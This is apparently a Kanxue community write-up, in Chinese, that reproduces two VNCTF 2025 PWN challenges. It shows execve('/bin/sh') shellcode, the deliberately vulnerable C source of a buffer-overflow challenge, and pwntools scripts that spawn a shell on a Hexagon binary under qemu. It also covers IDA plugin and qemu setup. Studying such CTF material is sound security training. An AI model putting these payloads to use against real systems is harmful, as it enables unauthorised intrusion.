#  VNCTF-2025-赛后复现   
周bosh  看雪学苑   2025-03-08 18:02  
  
PWN  
## 签到  
  
日常检查一下：  
  
  
```
llq@llq-virtual-machine:~$ checksec pwn
[*] '/home/llq/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
llq@llq-virtual-machine:~$

```  
  
  
  
只有canary是关的  
  
  
ida打开看一下main函数  
  
  
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+8h] [rbp-8h]

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  puts("hello hacker");
  puts("try to show your strength ");
  buf = mmap((void *)0x114514000LL, 0x1000uLL, 7, 34, -1, 0LL);
  read(0, buf, 0x16uLL);
  mprotect(buf, 0x1000uLL, 7);
  execute(buf);
  return 0;
}

```  
  
  
  
刚开始以为就是一个绕过、重定位  
  
  
但是注意看一下execute()函数  
  
  
看一眼汇编  
  
  
```
.text:00000000000011C9
.text:00000000000011C9
.text:00000000000011C9 ; void __fastcall execute(__int64)
.text:00000000000011C9                 public execute
.text:00000000000011C9 execute         proc near               ; CODE XREF: main+CA↓p
.text:00000000000011C9
.text:00000000000011C9 var_30          = qword ptr -30h
.text:00000000000011C9
.text:00000000000011C9 ; __unwind {
.text:00000000000011C9                 endbr64
.text:00000000000011CD                 push    rbp
.text:00000000000011CE                 mov     rbp, rsp
.text:00000000000011D1                 push    r15
.text:00000000000011D3                 push    r14
.text:00000000000011D5                 push    r13
.text:00000000000011D7                 push    r12
.text:00000000000011D9                 push    rbx
.text:00000000000011DA                 mov     [rbp+var_30], rdi
.text:00000000000011DE                 mov     rdi, [rbp+var_30]
.text:00000000000011E2                 xor     rax, rax
.text:00000000000011E5                 xor     rbx, rbx
.text:00000000000011E8                 xor     rcx, rcx
.text:00000000000011EB                 xor     rdx, rdx
.text:00000000000011EE                 xor     rsi, rsi
.text:00000000000011F1                 xor     r8, r8
.text:00000000000011F4                 xor     r9, r9
.text:00000000000011F7                 xor     r10, r10
.text:00000000000011FA                 xor     r11, r11
.text:00000000000011FD                 xor     r12, r12
.text:0000000000001200                 xor     r13, r13
.text:0000000000001203                 xor     r14, r14
.text:0000000000001206                 xor     r15, r15
.text:0000000000001209                 xor     rbp, rbp
.text:000000000000120C                 xor     rsp, rsp
.text:000000000000120F                 mov     rdi, rdi
.text:0000000000001212                 jmp     rdi

```  
  
  
  
当开始没看懂这个是干啥的，主要注意的是rsp会被置零。  
  
  
这里直接是复现j1ya师傅的，他建议直接打ret2syscall  
  
> 这里复习一下  
> **execve("/bin/sh", NULL, NULL)**  
> ****  
> 第一个参数要设置为/bin/sh，也是就rdi，  
后两个参数分别是rsi，rdx，因为是NULL就不设置了。  
>   
> 最后就是系统调用号的设置，因为是64位，翻一下笔记  
>   
> ![image-20250211163123744](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lc4BOEqlzVxUXbgPd066SrANeNaicFM6cdEDtL32ZbL7IPriafTXyuqE0w/640?wx_fmt=png&from=appmsg "")  
  
  
  
```
shellcode=asm(
'''mov al,59add rdi,8syscall'''
)+b'/bin/sh\x00'

```  
  
  
  
然后正常打即可  
  
  
![image-20250211164358817](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lcZl9mlzzaqOJLegpYNVd7et3WVTaYEUjcGxUrE3YtfoqWL89ruwsLTg/640?wx_fmt=png&from=appmsg "")  
##   
## hexagon  
  
这个直接是两眼一黑  
  
  
日常检查一下  
  
  
```
llq@llq-virtual-machine:~$ checksec main
[!] Could not populate PLT: AttributeError: arch ('em_qdsp6') must be one of ['aarch64', 'alpha', 'amd64', 'arm', 'avr', 'cris', 'i386', 'ia64', 'm68k', 'mips', 'mips64', 'msp430', 'none', 'powerpc', 'powerpc64', 'riscv32', 'riscv64', 's390', 'sparc', 'sparc64', 'thumb', 'vax']
[*] '/home/llq/main'
    Arch:       em_qdsp6-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x10000)
    Stripped:   No
llq@llq-virtual-machine:~$

```  
  
  
  
不认识的架构，直接搜一下  
  
  
![image-20250211183321012](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lc4v2icGZnPhwOUOHLtz19O7aZwnBDZBVgbV0hHyyWb2rAaibgVIHnVdKA/640?wx_fmt=png&from=appmsg "")  
  
![image-20250211183301653](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lcBTLicm2b58X0LwVSC0aS2WHsNbsZsQxdjT9pBDzBOhQYib16H40AlklQ/640?wx_fmt=png&from=appmsg "")  
  
  
大概扫一眼，看见了用于ida，想着要下一下插件。  
  
### 方法1  
  
这里我找了几篇文章看了看  
  
文章1  
  
文章2  
  
  
这里我开始找的还是比较麻烦的。  
  
  
首先根据文章1，进行文件下载下来按照正常readme按照即可。  
  
  
这里讲一下踩坑点  
  
  
![image-20250212133009099](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lcduqpufic567iaUMnuZeJd7szd3ZPcHjQjSOaRkxpe1hbhjXCPHa1rlnQ/640?wx_fmt=png&from=appmsg "")  
  
```
python -m pip install setuptools
python setup.py install

```  
  
  
  
◆敲这个命令的时候要注意要在内置的idapython里面敲，安装在ida内置的python里面要不然会报错找不到hexagondisasm包。  
  
  
◆解决安装后，笔者这里还遇到了disassembler模块引用找不到，这里找到安装hexagondisasm包路径如下：  
  
  
```
\.\.\IDA_Pro_7.7_max\IDA_Pro_7.7\python38\Lib\site-packages\hexag00n-0.1-py3.8.egg\hexagondisasm

```  
  
  
  
修改如下：  
  
  
```
from . import disassembler

```  
  
  
![image-20250212133521630](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lcZzte8Po230VgylR5LIlUZP0O4VrV6q9NbnhCpAia4WbabHAwzH9TFuA/640?wx_fmt=png&from=appmsg "")  
  
  
◆就在笔者以为大功告成的时候我们会发现，有一个函数居然找不到引用。  
  
  
![image-20250212134736256](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lcQYbYNwhr1h94rdWfYUxzrnRv1cC06A494qZn4KSibhPcn7J9tG1TajQ/640?wx_fmt=png&from=appmsg "")  
  
  
◆因为笔者的ida的版本是7.5以上，这个函数是被弃用了,也是又找了找，终于在文章2找到替代的hexagon.py文件，成功替换之后也是打开了这个异架构文件，注意勾选的时候选择一下即可。  
  
  
![image-20250212135150905](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lclZLhAYt18BwvLqfdXN19e7Xt0WIRFiboyvlC7toD5z4RuaiajKUfLFJw/640?wx_fmt=png&from=appmsg "")  
  
  
◆然后我们就成功的打开了  
  
  
![image-20250212135310681](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lcrqFzwjbPrqeEUqpZtyiajvVzQLqsdeypaghn2iasxgQoFJ9vUhzqNAbw/640?wx_fmt=png&from=appmsg "")  
###   
### 方法2  
  
但是，  
看完wp之后你会发现这里还有一个更简单的插件，也就是有师傅直接提供了dll。  
  
  
![image-20250212135528687](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lcAsibEej5CwiasT7xMBszlxoicHFQOmnOib65RIO30Sbn2LVVOgqzJaJ6Cg/640?wx_fmt=png&from=appmsg "")  
  
  
其实仔细看的开头的文章时，就应该看见这个的，只不过笔者，开始就找错了方向，一条路走到黑了。  
  
  
只能说  
  
  
文章3  
  
  
◆没啥好说的，找到自己对应的ida版本，下载之后放在procs目录下即可，笔者这里选的8.3  
  
  
![image-20250212135858715](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lcVjDqn04bj5x3B2KmGkCgjoIichISdgvQcRCLhzytjIF5X1PibicyLkwOQ/640?wx_fmt=png&from=appmsg "")  
  
  
◆直接打开就行了  
  
  
![image-20250212135956604](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lcLbJVsAF9GgkWhBk7iaqsuTqicBfDQ05SpftXW6iaZG3ib4vXLvxp5H3wJw/640?wx_fmt=png&from=appmsg "")  
  
  
方法解释如上，这里就可以正常解题，题目难度据作者说，难度已经降低了很多。根据wp说法就是一个正常的栈溢出的ret2text。  
  
### 解题：  
  
作者wp  
  
  
看下源码  
  
  
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln()
{
    char vul_buf[8];
    volatile int pad;
    volatile int key;
    scanf("%d", &key);
    read(0, vul_buf, 16);
    system("cat /home/ctf/log");
}

int main()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    puts("Welcome back, hexagon player!");
    vuln();
    return 0;
}

```  
  
  
  
这里笔者也是直接对着wp进行复现的  
  
  
根据wp看有几步是必须的  
  
  
◆qemu-user的安装  
  
  
```
sudo apt install qemu-user
which qemu-hexagon  ##查看一下有没有

```  
  
  
  
这里笔者的Ubuntu的版本是22.04，但是在20.04的版本下载之后是找不到qemu-hexagon  
  
  
这块只能自己手动编译  
  
  
![image-20250213144949614](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lcb0S7hWNFt0tiatSA7mDTFgUQU9V8udXHiawsqSnnOLbA8qXoDjFDcUZQ/640?wx_fmt=png&from=appmsg "")  
  
```
sudo apt update
sudo apt install build-essential pkg-config libglib2.0-dev libpixman-1-dev

git clone https://gitlab.com/qemu-project/qemu.git
cd qemu

./configure --target-list=hexagon-linux-user

make -j$(nproc)

sudo make install

```  
  
  
  
安装完之后可以自己查看一下是否安装成功了  
  
  
*注意：这里安装的时候不会直接安装成功，可能会报错，拷打一下GPT，安装一下相应的包即可。  
  
  
◆将libc链接到/lib里（这里注意要给一下绝对路径，要不然显示找不到如下图）  
  
  
```
sudo ln -sf /home/llq/hexagon/libc.so  /lib/ld-musl-hexagon.so.1

```  
  
  
![image-20250212181614701](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lceDO1UiaiariaF4JyV3otQBpTWicN9ibsBQicqSaZNKY9icuIbcSPX1EJFaGibA/640?wx_fmt=png&from=appmsg "")  
  
  
◆运行一下，注意可执行权限  
  
  
```
qemu-hexagon ./main

```  
  
  
![image-20250212181714101](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lc6hAibp13EgZGVU1E17LWMFq50ib3pBMwQYJjOicIxz38LSO8EibkWCa54g/640?wx_fmt=png&from=appmsg "")  
  
  
◆调试  
  
  
```
qemu-hexagon -L libc -d in_asm,exec,cpu,page,nochain -singlestep -dfilter 0x20420+0xc0 -strace -D ./log ./main

```  
  
  
  
这里也是根据wp的提示，直接看日志文件，找libc基址和栈地址。（看日志还是很简单的）  
  
  
![image-20250213154028105](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lcicNWvLuKhUugYU1VH3GGwunica0pzXXVedm0NzCyaPcBQxsPT5zEfepw/640?wx_fmt=png&from=appmsg "")  
  
![image-20250213154106143](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lcJnwNO86FpS0h2NufUnj69j0O1XE6hiaTjYBRfNJq1PImCncjMWuHX1w/640?wx_fmt=png&from=appmsg "")  
  
  
但是再找/bin/sh的地址时，直接看libc.so中文件的/bin/sh的偏移即可。  
  
  
![image-20250213154408051](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lc1MzStTsGx8G2SdOdTmKOjzMvhWDXiakL5q8yPq1orRO6Kibc09ANm8wQ/640?wx_fmt=png&from=appmsg "")  
  
  
这  
里看到  
  
  
![image-20250213154451923](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lcD2pMNhLPHibywjXbO0O5PfPoxLs3ytPb0Pj0tvibRsJsruBUfbaFTO8A/640?wx_fmt=png&from=appmsg "")  
  
  
满足三个条件就行，然后我们的脚本就可以正常跑了。  
  
  
```
from pwn import *

r=process('./main')
context(os='linux', log_level='debug')
libc = ELF('./libc.so')

stack = 0x4080efe8
libc_base = 0x3FEC0000 
binsh = libc_base+0x119f7

#r.recv()
r.sendline(str(binsh).encode())#传字符串/bin/sh

payload = p32(0)*2 + p32(stack+8)+p32(libc_base+0xBE7C0)
r.send(payload)#打ret2text

r.interactive()

```  
  
  
  
![image-20250213155650967](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lcW8owdLw816JMT9D6Ke7x7sWPibQem7KcJiaw18xmuqaXKlCY4D9JkBQQ/640?wx_fmt=png&from=appmsg "")  
  
  
这里讲一下笔者遇到的问题  
  
  
◆因为笔者用到Ubuntu22.04， qemu-user是带着qemu-hexagon的，也就是我们在跑本地的时候直接可以跑，但是在Ubuntu20.04下，会发生报错，所以就要设置一下架构也就是要按照作者的wp写。  
  
  
```
r = process(['qemu-hexagon', '-L', 'libc', '-d', 'in_asm,exec,cpu,nochain', '-dfilter', '0x20420+0xc0', '-strace', '-D', './log', './main'])

```  
  
  
  
◆还有就是题目的libc基址和栈地址都会发生改变（20.04）  
  
  
![image-20250213155526366](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lcmI4GcIbZLic1EBWiceibwoUWLh56iclT7POl4Sdxv2cK3RgvviaYTr6phHA/640?wx_fmt=png&from=appmsg "")  
  
  
![image-20250213155604086](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lcV494zTLb8Z4VCpTcxMNb9Ro7CeOhsfvegbicOISto6HPkxHIDUGbnRg/640?wx_fmt=png&from=appmsg "")  
  
  
```
from pwn import *

r = process(['qemu-hexagon', '-L', 'libc', '-d', 'in_asm,exec,cpu,nochain', '-dfilter', '0x20420+0xc0', '-strace', '-D', './log', './main'])
context(os='linux', log_level='debug')
libc = ELF('./libc.so')

stack =  0x4080f0b8
libc_base = 0x40810000
binsh = libc_base+0x119f7

#r.recv()
r.sendline(str(binsh).encode())

payload = p32(0)*2 + p32(stack+8)+p32(libc_base+0xBE7C0)
r.send(payload)

r.interactive()

```  
  
  
  
![image-20250213155956253](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lcFodO9LfpQjmK07rpmr1OwY2yzTFpvFB8LRtKiaqOf6eT0jt7C4yXnPA/640?wx_fmt=png&from=appmsg "")  
  
  
更换为0x3FEC0000则跑不通  
  
  
![image-20250213160112662](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lcebF8eEuzHJDVSpxaJEzyeNB8VtoUQTwXAckM5TRf6BvgqTSuuPDRbg/640?wx_fmt=png&from=appmsg "")  
###   
### 总结：  
  
在安装插件的时候，卡的时间较长(建议直接使用方法2来安装插件)，并且在调试的时候建议使用Ubuntu22.04减去不必要的麻烦(笔者20.04也试了试，觉得没有必要)。并且看作者的另一篇文章，他是有模拟过这个环境的，并且在使用gdb-multiarch进行远程调试的时候遇到了问题，这里笔者没有进行复现，而是草草了事，其实可以动调一下复现一下作者的下面这句话，加深一下对该异架构的汇编命令的理解程度。  
  
  
![image-20250213160851438](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lcfuW4dRfLzPFZ9FeRKrkScLZ4sqJvtV6tlF63xyBWDDUQib0pMsPXP6A/640?wx_fmt=png&from=appmsg "")  
  
  
复现的时候主要难度在于环境的复现，对应异架构的汇编指令也可以多看看开发手册，理解其寄存器的调用。对于 qemu-user的使用，也需更加熟练些，因为复现过一些漏洞，对于其还有一些了解，不算抓瞎。  
  
  
  
**特别感谢：**  
  
inf_师傅  
  
l1s00t师傅  
  
  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lcAxWusBao1HLjTrv8yxO4YbnYkM1icvnNps0iaiage6Y5l2JJwepwLfrOg/640?wx_fmt=jpeg "")  
  
  
看雪ID：周bosh  
  
https://bbs.kanxue.com/user-home-1011755.htm  
  
*本文为看雪论坛优秀文章，由 周bosh 原创，转载请注明来自看雪社区  
  
  
  
# 往期推荐  
  
1、[2024春秋杯网络安全联赛冬季赛-RE所有题目WP](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458590381&idx=2&sn=5afb07b56b06347c4af821ed37826f12&scene=21#wechat_redirect)  
  
  
2、[安卓签名校验-探讨](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458590330&idx=1&sn=2cebc5b0ae34a171f418d56fa1086982&scene=21#wechat_redirect)  
  
  
3、[pyd文件逆向](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458590213&idx=1&sn=8ac33f2b66257296cc0e4c41ae141301&scene=21#wechat_redirect)  
  
  
4、[AMSI简介及绕过方法总结](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458590191&idx=2&sn=5303a8192f311d09f00a5e8db0ef8b38&scene=21#wechat_redirect)  
  
  
5、[2025 HGAME WEEK1 RE WP](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458590117&idx=2&sn=3b4b874dabd5b0cd85af1196f318834a&scene=21#wechat_redirect)  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lceIkxaY71mzW5gOxdWdic7QibhaLjckpeKza7MqEmCoMJXy5BTFKNFnNg/640?wx_fmt=gif&from=appmsg "")  
  
**球分享**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lceIkxaY71mzW5gOxdWdic7QibhaLjckpeKza7MqEmCoMJXy5BTFKNFnNg/640?wx_fmt=gif&from=appmsg "")  
  
**球点赞**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lceIkxaY71mzW5gOxdWdic7QibhaLjckpeKza7MqEmCoMJXy5BTFKNFnNg/640?wx_fmt=gif&from=appmsg "")  
  
**球在看**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8FwPmAUPj9VFC18uibWbG9lcsCl0NKVuiczeaZgcXQSicwNPVib5raMJMHc1Xqicn9mUN4FpzVRicibtKp9Q/640?wx_fmt=gif&from=appmsg "")  
  
点击阅读原文查看更多  
  
